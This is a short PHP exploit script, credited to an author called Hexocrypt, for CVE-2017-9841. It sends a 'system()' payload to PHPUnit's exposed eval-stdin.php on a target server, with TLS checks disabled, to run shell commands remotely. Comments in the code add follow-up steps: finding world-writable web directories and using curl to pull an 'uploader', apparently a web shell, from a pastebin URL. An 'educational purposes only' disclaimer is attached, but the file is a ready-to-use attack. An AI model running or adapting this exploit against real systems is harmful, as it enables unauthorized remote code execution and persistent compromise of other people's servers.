<?php

/**
 * PHPunit RCE Exploiter
 * Coded By Hexocrypt
 * CVE : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9841
 * Github : https://github.com/hexocrypt
 * Disclaimer: This code is for educational purposes only.
 */

error_reporting(1);

$path ="https://target/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php";

$command = "uname -a";
//find writable directory : find /var/www/html/ -type d -perm -o+w
//get uploader : curl -s https://pastebin.com/raw/f4xQX4sL -o zzzz.php
$data = "<?php system('$command');?>" ;

$ch = curl_init();

curl_setopt($ch, CURLOPT_URL,$path);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
$resp = curl_exec($ch);
curl_close ($ch);
print_r($resp);

?>
